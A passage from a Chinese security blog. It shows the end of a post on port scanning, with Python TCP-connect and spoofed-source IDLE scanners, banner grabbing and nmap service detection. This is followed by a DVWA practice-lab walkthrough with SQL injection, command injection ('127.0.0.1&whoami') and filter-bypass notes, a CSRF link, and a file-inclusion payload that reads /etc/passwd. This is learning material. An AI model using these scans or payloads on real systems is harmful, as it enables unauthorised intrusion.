class="number">48080</span>,<span class="number">49152</span>,<span class="number">49153</span>,<span class="number">49154</span>,<span class="number">49155</span>,<span class="number">49156</span>,<span class="number">49157</span>,<span class="number">49158</span>,<span class="number">49159</span>,<span class="number">49160</span>,<span class="number">49163</span>,<span class="number">49165</span>,<span class="number">49167</span>,<span class="number">49175</span>,<span class="number">49400</span>,<span class="number">49999</span>,<span class="number">50000</span>,<span class="number">50001</span>,<span class="number">50002</span>,<span class="number">50006</span>,<span class="number">50300</span>,<span class="number">50389</span>,<span class="number">50500</span>,<span class="number">50636</span>,<span class="number">50800</span>,<span class="number">51103</span>,<span class="number">51493</span>,<span class="number">52673</span>,<span class="number">52822</span>,<span class="number">52848</span>,<span class="number">52869</span>,<span class="number">54045</span>,<span class="number">54328</span>,<span class="number">55055</span>,<span class="number">55555</span>,<span class="number">55600</span>,<span class="number">56737</span>,<span class="number">57294</span>,<span class="number">57797</span>,<span class="number">58080</span>,<span class="number">60020</span>,<span class="number">60443</span>,<span class="number">61532</span>,<span class="number">61900</span>,<span class="number">62078</span>,<span class="number">63331</span>,<span class="number">64623</span>,<span class="number">64680</span>,<span class="number">65000</span>,<span class="number">65129</span>,<span class="number">65389</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">defualt_port=top50_list+top100_list+top1000_list</span><br><span class="line">port_set=<span class="built_in">set</span>(defualt_port)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">65535</span>):</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> port_set:</span><br><span class="line">        defualt_port.append(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    usage = <span class="string">&quot;Usage: %prog -i &lt;ip address&gt; -p &lt;dst port&gt;&quot;</span>	<span class="comment"># 输出帮助信息</span></span><br><span class="line">    parse = OptionParser(usage=usage)</span><br><span class="line">    parse.add_option(<span class="string">&quot;-i&quot;</span>, <span class="string">&#x27;--ip&#x27;</span>, <span class="built_in">type</span>=<span class="string">&quot;string&quot;</span>, dest=<span class="string">&quot;address&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;specify the IP address&quot;</span>)	<span class="comment"># 获取网段地址</span></span><br><span class="line">    parse.add_option(<span class="string">&quot;-p&quot;</span>, <span class="string">&#x27;--port&#x27;</span>, <span class="built_in">type</span>=<span class="string">&quot;string&quot;</span>, dest=<span class="string">&quot;port&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;target port range,default option d&quot;</span>)</span><br><span class="line">    option, args = parse.parse_args()	<span class="comment">#实例化用户输入的参数</span></span><br><span class="line">    IP = option.address</span><br><span class="line">    PORT = option.port</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] The TCP Connect Port Scan start&#x27;</span>)</span><br><span class="line">    <span class="comment"># PORT = input(&quot;Please Input PORT（Separated by &#x27;,&#x27;）:&gt;&quot;)</span></span><br><span class="line">    <span class="keyword">if</span> PORT==<span class="string">&quot;d&quot;</span>:</span><br><span class="line">        portList=defualt_port</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        portList = PORT.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> portList:</span><br><span class="line">        <span class="keyword">if</span> i.isdigit():</span><br><span class="line">            t = threading.Thread(target=PortScanner, args=(IP, <span class="built_in">int</span>(i)))</span><br><span class="line">            <span class="comment"># args 动态参数就是传入的参数的个数是动态的</span></span><br><span class="line">            t.start()</span><br><span class="line">            t.join()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            newPortList = i.split(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">            startPort = <span class="built_in">int</span>(newPortList[<span class="number">0</span>])</span><br><span class="line">            endPort = <span class="built_in">int</span>(newPortList[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">for</span> port <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(newPortList[<span class="number">0</span>]), <span class="built_in">int</span>(newPortList[<span class="number">0</span>])):</span><br><span class="line">                t = threading.Thread(target=PortScanner, args=(IP, port))</span><br><span class="line">                t.start()</span><br><span class="line">                t.join()</span><br><span class="line">    setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] The TCP CONNECT SCAN is complete!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>缺陷</strong>
容易被发现</p>
<h2 id="idle"><a class="markdownIt-Anchor" href="#idle"></a> IDLE</h2>
<p>不太常见，也不好用，但比较巧妙，记录下来。
步骤 1：检测第三方的 IP ID 值并记录下来。
步骤 2：在本机上伪造一个源地址为第三方主机的数据包，并将数据包发送给目标主机端口，根据目标端口状态的不同，目标主机可能会导致第三方主机的 IP ID 值增加。
步骤 3：再回来检查第三方主机的 IP ID 值。比较这两次的值。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> scapy.layers.inet <span class="keyword">import</span> IP, TCP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">ip, port</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 步骤1：检测第三方的IP ID值并记录下来。</span></span><br><span class="line">        third_party_ip = <span class="string">&quot;192.168.42.128&quot;</span></span><br><span class="line">        packet = IP(dst=third_party_ip)</span><br><span class="line">        response = sr1(packet, timeout=<span class="number">0.5</span>, verbose=<span class="number">0</span>)</span><br><span class="line">        pre_id = response[IP].<span class="built_in">id</span></span><br><span class="line">        <span class="comment"># 步骤2：在本机上伪造一个源地址为第三方主机的数据包，并将数据包发送给目标主机端口</span></span><br><span class="line">        packet2 = IP(src=third_party_ip, dst=ip) / TCP(flags=<span class="string">&quot;S&quot;</span>, dport=port)</span><br><span class="line">        send(packet2, verbose=<span class="number">0</span>)</span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">        <span class="comment"># 步骤3：再回来检查第三方主机的IP ID值。</span></span><br><span class="line">        packet3 = IP(dst=third_party_ip)</span><br><span class="line">        response3 = sr1(packet3, timeout=<span class="number">0.5</span>, verbose=<span class="number">0</span>)</span><br><span class="line">        next_id = response3[IP].<span class="built_in">id</span></span><br><span class="line">        <span class="keyword">if</span> next_id == (pre_id + <span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] PORT &quot;</span> + port + <span class="string">&quot; maybe open&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] Scan start&#x27;</span>)</span><br><span class="line">    IP = <span class="string">&quot;192.168.42.129&quot;</span></span><br><span class="line">    <span class="comment"># PORT = input(&quot;Please Input PORT（Separated by &#x27;,&#x27;）:&gt;&quot;)</span></span><br><span class="line">    portList = [<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3307</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> portList:</span><br><span class="line">        scan(IP, i)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] Scan complete!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p><strong>缺陷</strong>
不能并行，扫描时间较长，需第三方网络不太活跃的主机，扫描结果不一定准确
这种方法网上没人写是有原因的，成功率不高。暂时想不到改进措施。</p>
<h2 id="其他方式-2"><a class="markdownIt-Anchor" href="#其他方式-2"></a> 其他方式</h2>
<p>这篇文章基本就是 NMAP 里提到的技术，配了点插图，更好理解。</p>
<h3 id="udp-扫描"><a class="markdownIt-Anchor" href="#udp-扫描"></a> UDP 扫描</h3>
<p>与 C 段扫描中说到的方法一模一样，这里提一下。UDP 扫描发送空的(没有数据)UDP 报头到每个目标端口。 如果返回 ICMP 端口不可到达错误(类型 3，代码 3)， 该端口是 closed(关闭的)。 其它 ICMP 不可到达错误(类型 3， 代码 1，2，9，10，或者 13)表明该端口是 filtered(被过滤的)。 偶尔地，某服务会响应一个 UDP 报文，证明该端口是 open(开放的)。 如果几次重试后还没有响应，该端口就被认为是 open|filtered(开放|被过滤的)。 这意味着该端口可能是开放的，也可能包过滤器正在封锁通信。</p>
<p>| ICMP 端口不可到达错误(类型 3，代码 3)                 | closed   |
| ----------------------------------------------------- | -------- | -------- |
| ICMP 不可到达错误(类型 3， 代码 1，2，9，10，或者 13) | filtered |
| 响应                                                  | open     |
| 重试未响应                                            | open     | filtered |</p>
<h3 id="tcp-nullfinand-xmas-扫描"><a class="markdownIt-Anchor" href="#tcp-nullfinand-xmas-扫描"></a> TCP Null，FIN，and Xmas 扫描</h3>
<p>如果 [目标]端口状态是关闭的.... 进入的不含 RST 的报文导致一个 RST 响应 如果扫描系统遵循该 RFC，当端口关闭时，任何不包含 SYN，RST，或者 ACK 位的报文会导致 一个 RST 返回；而当端口开放时，应该没有任何响应。
如果收到一个 RST 报文，该端口被认为是 closed，而没有响应则意味着 端口 open|filtered。 如果收到 ICMP 不可到达错误(类型 3，代号 1，2，3，9，10，或者 13)，该端口 filtered。可以通过一些无状态防火墙和报文过滤路由器 ，比 SYN 扫描还要隐秘一些</p>
<h3 id="tcp-ack-扫描"><a class="markdownIt-Anchor" href="#tcp-ack-扫描"></a> TCP ACK 扫描</h3>
<p>这种扫描技术无法确定端口的开放性，因为它做的就是发送一个 ACK 报文，但服务端在收到该报文时，无论端口是否开放(open/closed)，只要未被过滤，都会返回一个 RST 报文，将它们认为是 unfiltered，而当扫描一个端口未得到响应时则认为是 filtered，同样的 ICMP 不可达也认为是 filtered。</p>
<table>
<thead>
<tr>
<th>行为</th>
<th>状态</th>
</tr>
</thead>
<tbody>
<tr>
<td>收到 RST 报文</td>
<td>unfiltered(open/closed)</td>
</tr>
<tr>
<td>未响应</td>
<td>filtered</td>
</tr>
<tr>
<td>ICMP 不可达</td>
<td>filtered</td>
</tr>
</tbody>
</table>
<h3 id="tcp-窗口扫描"><a class="markdownIt-Anchor" href="#tcp-窗口扫描"></a> TCP 窗口扫描</h3>
<p>发送一个 ACK 报文，到目标关闭的端口，会发现 window 的字段为 0。可以根据 window 值是正值 or 0 来判断目标端口是 open 还是 closed。
现在大多数情况都不管用了。</p>
<h3 id="tcp-maimon-扫描"><a class="markdownIt-Anchor" href="#tcp-maimon-扫描"></a> TCP Maimon 扫描</h3>
<p>这个名称是用此项扫描提出者 Uriel Maimon 的名字命名的。这项技术和 Null，FIN，以及 Xmas 扫描是一样的，但是要注意它的探测报文使用的是 FIN/ACK。根据 RFC 793 (TCP)，无论端口开放或者关闭，都应该对这样的探测响应 RST 报文。 然而，Uriel 注意到如果端口开放，许多基于 BSD 的系统只是丢弃该探测报文。</p>
<h3 id="ftp-弹跳扫描"><a class="markdownIt-Anchor" href="#ftp-弹跳扫描"></a> FTP 弹跳扫描</h3>
<p>允许用户连接到一台 FTP 服务器，然后要求文件送到一台第三方服务器。请求 FTP 服务器轮流发送一个文件到目标主机上的所感兴趣的端口。 错误消息会描述端口是开放还是关闭的。</p>
<h1 id="服务识别"><a class="markdownIt-Anchor" href="#服务识别"></a> 服务识别</h1>
<h2 id="默认端口"><a class="markdownIt-Anchor" href="#默认端口"></a> 默认端口</h2>
<p>比较无脑的方法是默认应用不会改变其运行的默认端口，只需将端口扫描的结果与常见应用所占端口对比就可以确定该端口上运行的服务。
显然现实总不能如我们所愿，如果服务运行在奇奇怪怪的端口，或者用了别的服务的默认端口，直接查表显然是不科学的。</p>
<h2 id="banner-信息"><a class="markdownIt-Anchor" href="#banner-信息"></a> banner 信息</h2>
<p>除此之外，有一个相对简单的方式就是通过无阻塞套接字和探查，然后对响应进行匹配以期得到一个正确的探测结果，在使用 nmap 探测一个 nc 监听的端口时会发现收到了一个 GET / HTTP/1.0。
那么同样可以使用 python 的 socket 发送它来得到服务响应。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># TCP端口探测（TCP服务被动识别）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">TcpPort</span>(<span class="params">ip, port</span>):</span><br><span class="line">    banner = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    status = <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        sock.settimeout(<span class="number">3</span>)</span><br><span class="line">        sock.connect((ip, port))</span><br><span class="line">        status = <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="comment"># 被动服务识别</span></span><br><span class="line">    <span class="keyword">if</span> status:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            banner = sock.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;banner&quot;</span>: banner, <span class="string">&quot;port&quot;</span>: port&#125;</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;banner&quot;</span>: banner, <span class="string">&quot;port&quot;</span>: port&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fi-1aE8NjmAZsqQF6Gi0OmOq9IKn.png" alt="" />
可以看到结果中，http 服务没有返回 banner，该方法也存在局限性。</p>
<h2 id="payload"><a class="markdownIt-Anchor" href="#payload"></a> payload</h2>
<p>首先看一下 nmap 能扫出来的东西：
<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FhVkgrolRppCmHsB5nvPhisZ1qa_.png" alt="" />
在<a target="_blank" rel="noopener" href="http://www.nmap.com.cn/doc/manual.shtm#8">Nmap 参考指南中文版</a>中提到，nmap 会使用 nmap-service-probes 文件，里面存放着不同服务的探测报文和解析识别响应的匹配表达式。正常人应该会直接使用 nmap 吧？</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> nmap</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">NmapScan</span>(<span class="params">targetIP, targetPort</span>):</span><br><span class="line">    <span class="comment"># 实例化PortScanner对象</span></span><br><span class="line">    nm = nmap.PortScanner()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># hosts为目标IP地址,argusments为Nmap的扫描参数</span></span><br><span class="line">        <span class="comment"># -p:对指定端口进行扫描</span></span><br><span class="line">        <span class="comment"># -sV:对端口进行服务程序探测</span></span><br><span class="line">        result = nm.scan(hosts=targetIP, arguments=<span class="string">&#x27;-sV -p&#x27;</span> + <span class="built_in">str</span>(targetPort))</span><br><span class="line">        <span class="comment"># 对结果进行切片，提取端口信息</span></span><br><span class="line">        <span class="comment"># 这里需要注意的是,提取信息时需要把端口转化为int型</span></span><br><span class="line">        port_infor = result[<span class="string">&#x27;scan&#x27;</span>][targetIP][<span class="string">&#x27;tcp&#x27;</span>][<span class="built_in">int</span>(targetPort)]</span><br><span class="line">        <span class="comment"># 分别显示  端口号：端口状态 端口服务:端口服务程序</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[&#123;&#125;:&#123;&#125;] : [&#123;&#125;:&#123;&#125;]&quot;</span>.<span class="built_in">format</span>(targetPort, port_infor[<span class="string">&#x27;state&#x27;</span>], port_infor[<span class="string">&#x27;name&#x27;</span>], port_infor[<span class="string">&#x27;product&#x27;</span>]))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Ftyb7oUY-TYhQe9rQpIFr2b6GHD4.png" alt="" />
当然 nmap 也有识别不准的时候，参考之前提到的博客，可以自己抓包获取 payload，针对特定服务，会更加准确些。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://c4ooc0.github.io/2022/06/13/DVWA%20%E6%94%BB%E7%95%A5%E7%BB%8F%E5%8E%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/images.jpg">
      <meta itemprop="name" content="c4ooc0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="c4ooc0个人博客">
      <meta itemprop="description" content="永怀谦卑与求知欲">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | c4ooc0个人博客">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/06/13/DVWA%20%E6%94%BB%E7%95%A5%E7%BB%8F%E5%8E%86/" class="post-title-link" itemprop="url">DVWA 攻略经历</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-06-13 10:50:31" itemprop="dateCreated datePublished" datetime="2022-06-13T10:50:31+08:00">2022-06-13</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2022-11-17 10:46:24" itemprop="dateModified" datetime="2022-11-17T10:46:24+08:00">2022-11-17</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>3.4k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>12 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <blockquote>
<p>竟然写完了
部署到云服务器上了</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u014029795/article/details/100006641">DVWA 攻略</a>写的很好了，这里仅作一些知识点备忘录</p>
<h1 id="brute-force"><a class="markdownIt-Anchor" href="#brute-force"></a> Brute Force</h1>
<p>可以通过 php 代码发现，用户名没有做任何过滤，但密码取 md5，之后就是 sql 语句了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Get username</span></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get password</span></span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br></pre></td></tr></table></figure>
<ul>
<li>爆破，根据 echo 可以看出攻击者不能区分用户名错还是密码错，于是用户名和密码需要组合爆破</li>
<li>因为用户名没有做任何过滤，可以使用 sql 注入<code>admin’ or '1′='1</code></li>
</ul>
<p>BurpSuite 爆破步骤</p>
<blockquote>
<p>用 Java 命令运行 bp 的 jar 包，获得更大的 jvm 内存
java17+burpsuitecommunity2022 运行命令：
<code>java -Xmx2048M --add-opens=java.desktop/javax.swing=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED -jar BP路径\burpsuite_community.jar </code>
使用批处理文件实现，遇到 jar 路径有空格，命令报错，解决方法：整个路径加双引号</p>
</blockquote>
<ol>
<li>服务器设置代理，BP 拦截，抓到登录点 login 发出的包</li>
<li>发送到 Intruder 模块来进行爆破，在 Position 中的 Attack type 选择 cluster boomb，清除其它的爆破项，选择用户名和密码两个字段进行爆破</li>
<li>在 Payloads 中为两个字段设置字典，新版 BP 在选择 resource pool 下面有个 create new source pool 可以重新设置线程数，勾选 maximum concurrent <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=requests&amp;spm=1001.2101.3001.7020">requests</a>，并且进行参数的设置，Attack 开始</li>
<li>看到 length 有变，基本就差不错了</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Sanitise username input</span></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"><span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitise password input</span></span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Medium 级别的代码主要增加了 mysql_real_escape_string 函数，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，基本上能够抵御 sql 注入攻击(宽字节注入可以搞定)，但是，依然没有加入有效的防爆破机制</p>
<h1 id="command-injection"><a class="markdownIt-Anchor" href="#command-injection"></a> Command Injection</h1>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Windows</span></span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// *nix</span></span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>前端输入一个 ip 地址，后端 ping，因为没有做过滤，ip 地址后面跟&amp;命令即可
<code>127.0.0.1&amp;whoami</code></p>
<ul>
<li>字符过滤</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://linux.cn/article-2469-1.html#:~:text=Linux%E4%B8%AD%E5%91%BD%E4%BB%A4%E9%93%BE%E6%8E%A5%E6%93%8D%E4%BD%9C%E7%AC%A6%E7%9A%84%E5%8D%81%E4%B8%AA%E6%9C%80%E4%BD%B3%E5%AE%9E%E4%BE%8B%201%20%E5%92%8C%E5%8F%B7%E6%93%8D%E4%BD%9C%E7%AC%A6%20%28%26%29%202%20%E5%88%86%E5%8F%B7%E6%93%8D%E4%BD%9C%E7%AC%A6%20%28%3B%29%203,%E4%BC%98%E5%85%88%E6%93%8D%E4%BD%9C%E7%AC%A6%20%28%29%20Command_x1%20%26%26Comma%20...%2010%20%E8%BF%9E%E6%8E%A5%E7%AC%A6%20%28%5C%29">Linux 中命令链接操作符</a>
例如 medium 过滤了&quot;&amp;&amp;” 、”;”,用别的字符代替就好，例如“&amp;”“|”等。
hard 过滤表：
'&amp;' =&gt; '',
';' =&gt; '',
'| ' =&gt; '',
'-' =&gt; '',
'$' =&gt; '',
'(' =&gt; '',
')' =&gt; '',
'`' =&gt; '',
'||' =&gt; '',
|后有个空格，不加空格就行</p>
<h1 id="csrf"><a class="markdownIt-Anchor" href="#csrf"></a> CSRF</h1>
<p>CSRF，全称 Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。
构造链接
<a target="_blank" rel="noopener" href="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</a>
有验证：
<code> if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false )</code>
stripos 检查 string 中是第一次出现 pattern 的位置（不区分大小写）</p>
<h3 id="anti-csrf-token"><a class="markdownIt-Anchor" href="#anti-csrf-token"></a> Anti-csrf token</h3>
<p>安装插件 CSRF Token Tracke</p>
<h1 id="file-inclusion"><a class="markdownIt-Anchor" href="#file-inclusion"></a> File Inclusion</h1>
<p><code>$file = $_GET[ 'page' ];</code>
没有验证，直接改 page 参数：<code>?page=/etc/passwd</code></p>
